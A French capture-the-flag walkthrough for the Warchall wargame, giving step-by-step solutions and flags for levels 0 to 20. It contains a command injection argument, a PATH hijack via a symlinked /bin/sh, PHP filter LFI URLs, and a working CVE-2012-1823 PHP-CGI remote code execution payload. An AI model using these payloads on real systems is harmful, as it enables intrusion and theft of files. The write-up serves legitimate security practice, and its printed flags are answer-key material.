# Writes Up
### Prérequis :
Pour pouvoir démarrer ce challenge, il faut d'abord ouvrir un compte dans le site web wechall.net.
Après cela, il faut s'authentifié.
Après l'authentification dans le terminal telle que le nom d'utilisateur et le mot de passe SSH, rediriger vous dans votre répertoire personnel en utilisant `cd ~` et utilisez `ls` pour avoir un aperçu des fichiers.
Pour avoir un aperçu de tous les levels, utilisez `cd /home/level` pour vous déplacer vers le répertoire "/home/level".


## Niveau 0
Dans le répertoire "level", ouvrez "00_welcome" avec `cd 00_welcome`.
Utilisez `cat README.md` pour lire le contenu, et dans cette dernière se trouve la solution pour le début de ce challenge.


## Niveau 1
Utilisez `cd /home/level/01_choice_tree` pour accéder au dossier level1, puis explorez son contenu avec `ls`, et on peut y trouver plusieurs répertoire qu'on peut explorer.

Comme la solution n'était pas dans README.md comme dans le premier level, utilisez `cd blue/hats/grey` pour naviguer à travers les dossiers, en commençant par "blue" puis en passant à "hats" et ensuite "grey".

Utilisez `cd solution/`, puis `cd patience/`.

Utilisez `cat SOLUTION.txt` pour afficher son contenu et récupérer la solution pour le niveau 1.


## Niveau 2
Utilisez `cd /home/level/02` et affichez tous les fichiers, y compris les fichiers cachés, avec `ls -al`.

Entrez dans le dossier caché ".porb" en utilisant `cd .porb`.

Ouvrez ".solution" avec `cat .solution` pour accéder à la solution du niveau 2.



## Niveau 3
Accédez au dossier level3 en utilisant `cd /home/level/03`, puis `ls -al`.
Utilisez `cat .bash_history` pour ouvrir le fichier .bash_history et trouver la solution du niveau 3.



## Niveau 4
Entrez dans le dossier 04_kwisatz avec `cd /home/level/04_kwisatz`, et vérifiez les fichiers avec `ls` où vous devriez trouver un fichier nommé README.nfo.

Suivez README.nfo vers votre répertoire personnel, utilisez `cd ~` puis `cd /level/04_kwisatz`, à l'intérieur vous devriez voir un fichier "README.txt".

Et dans README.txt, il y a une consigne qui est de naviguer vers README2.md, qui est encore inaccessible à cause des permissions. Vérifiez les permissions sur README2.md en utilisant `ls -al`, et ajoutez la permission de lecture avec `chmod +r README2.md`

Ouvrez README2.md avec `cat README2.md` pour accéder à la solution



## Niveau 5
Entrez dans le dossier 05_privacy, utilisez `cd /home/level/05_privacy`.

Vérifiez la présence du fichier README.md avec `ls`.
Pour pouvoir avoir l'aperçu du fichier README.md, on va utiliser `ls`.

Ouvrez le fichier README.md avec `cat README.md` pour accéder à la solution.


## Niveau 8 - SSH... Z is sleeping
Dirigez-vous vers le répertoire level 08.
- `cd /home/level/08_sshz`

Affichez tous les fichiers.
- `ls -al #Tous les fichiers appartiennent à level08`

Dans le fichier authorized_keys.backup se trouve une clé RSA de 2048 bits. Utilisez les commandes suivantes pour vérifier les empreintes :
- `ssh-keygen -lf /home/level/08_sshz/backups/authorized_keys.backup  # SHA256`
- `ssh-keygen -l -E md5 -f /home/level/08_sshz/backups/authorized_keys.backup  # MD5`

Téléchargez le fichier tar Debian SSH RSA 2048 x86 depuis ce lien.
Sur Windows, ouvrez PowerShell en tant qu'administrateur

Utilisez SCP pour copier la clé privée vers le serveur :
- `scp -P 19198 /chemin/vers/2bcd07a701e94a0474d77ee4d6d0f806-23669 user@warchall.net:~/`

Assurez-vous que les permissions appropriées sont définies pour la clé privée sur le serveur :
- `chmod 600 ~/2bcd07a701e94a0474d77ee4d6d0f806-23669`

Connectez-vous au serveur en tant que level08 en utilisant la clé privée :
- `ssh -i ~/2bcd07a701e94a0474d77ee4d6d0f806-23669 level08@warchall.net -p 19198`


## Niveau 10 - Choose your PATH
Naviguez vers le répertoire "Choose Your Path".
Exécutez l'exécutable charp avec l'argument fourni.
Consultez le contenu du fichier généré à ~/foo.
`
- `cd /home/level/10_choose_your_path/`
- `./charp "solution.txt ; cat solution.txt > ~/foo"`
- `cat ~/foo`


## Niveau 11 - Choose yout PATH II
Naviguez vers le répertoire "Choose Your Path II".
Créez un lien symbolique vers `/bin/sh à ~/wc.`
Exécutez l'exécutable charp2 avec l'argument fourni.
- `cd /home/level/11_choose_your_path2/`
- `ln -s /bin/sh ~/wc`
- `PATH=~ ./charp2 "/bin/cat solution.txt 1>&2"`


## Niveau 12 - Py-thong
Naviguez vers le répertoire "Pythong".
Exécutez l'exécutable pytong avec l'argument fourni.
- `cd /home/level/12_pytong/`
- `./pytong <(echo magie)`


# Niveau 13 - Warchall: Essais

1. **Création du programme cat.c :**

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {
    FILE *fp = fopen(argv[1], "w");
    char buf[16];
    memset(buf, 0, sizeof buf);
    lseek(3, 0, SEEK_SET);
    read(3, buf, sizeof buf);
    fprintf(fp, "%s", buf);
    return 0;
}
```
Compilez cat.c
```c
gcc -m32 cat.c -o cat
```

Exécutez le cat compilé :
```c
./cat
```


Ajoutez le répertoire contenant le binaire cat à la variable d'environnement PATH :
```c
export PATH=$HOME:$PATH
```


Naviguez vers le répertoire où se trouve l'exécutable tryouts :
```c
cd /home/level/matrixman/13_tryouts
```


Exécutez les essais :
```c
./tryouts
```


Interrompez le processus des essais en utilisant Ctrl + C.
Consultez le contenu du fichier ~/seed, la solution s'y trouve :
```c
more ~/seed
```


## Niveau 14 - Warchall: Inclusion de fichiers locaux (LFI)
Utilisez le filtre PHP suivant pour lire et encoder le contenu du fichier "solution.php" en base64 :
- `php://filter/read=convert.base64-encode/resource=solution.php`

Accédez au point d'extrémité vulnérable : 
[https://lfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php](https://lfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php)

Décodez le contenu encodé en base64 ci-dessous pour révéler la solution.

Contenu encodé en base64 :
```c
PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K
```


## Niveau 15 - Warchall: Inclusion de fichiers locaux (RFI)
Utilisez le filtre PHP suivant pour lire et encoder le contenu du fichier "solution.php" en base64 :
- `php://filter/read=convert.base64-encode/resource=solution.php`

Accédez au point d'extrémité vulnérable : 
[https://rfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php](https://rfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php)

Décodez le contenu encodé en base64 ci-dessous pour révéler la solution.

Contenu encodé en base64 :
```c
PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5P
go8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgo
KCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K
```




## Niveau 20 - Warchall: Exécution de code à distance (RCE)

Ce défi implique l'exploitation d'une vulnérabilité spécifique, à savoir CVE-2012-1823 (Exécution de code à distance avec PHP-CGI).

**Vue d'ensemble de la vulnérabilité**

La vulnérabilité permet à un attaquant d'exécuter du code arbitraire via PHP-CGI en manipulant les paramètres qui lui sont passés. Plus précisément, l'ajout de paramètres comme ?-s à l'URL simule les paramètres PHP-CGI tels que /usr/bin/php53-cgi/php-cgi -f index.php -s.

**Analyse initiale**

- Explorez les options de PHP-CGI en utilisant php-cgi --help.
- Remarquez que le script cible (index.php) inclut un autre fichier (config.php) en utilisant l'instruction require '../config.php';.
- Identifiez les chemins absolus des fichiers : /home/level/20_live_rce/www/index.php et /home/level/20_live_rce/config.php.

**Étapes d'exploitation**

- Utilisez des paramètres PHP-CGI pour définir des entrées INI :
    - -dallow_url_include=On : Permet d'inclure des fichiers distants.
    - -dauto_prepend_file=/tmp/2.php : Spécifie un fichier à inclure avant de traiter le fichier demandé.
- Créez /tmp/2.php avec le contenu suivant :

```php
<?php
exec("cat /home/level/20_live_rce/config.php", $out);
print_r($out);
?>
```

Accédez au script cible avec les paramètres manipulés :
- `http://rce.warchall.net/?-dallow_url_include=On+-dauto_prepend_file=/tmp/2.php+-n`

Accédez au script cible avec les paramètres manipulés et l'URL encodée :
- `http://rce.warchall.net/?-dallow_url_include%3DOn+-dauto_prepend_file%3D%2ftmp%2f2.php+-n`


Inspectez le code source pour révéler plus d'informations.






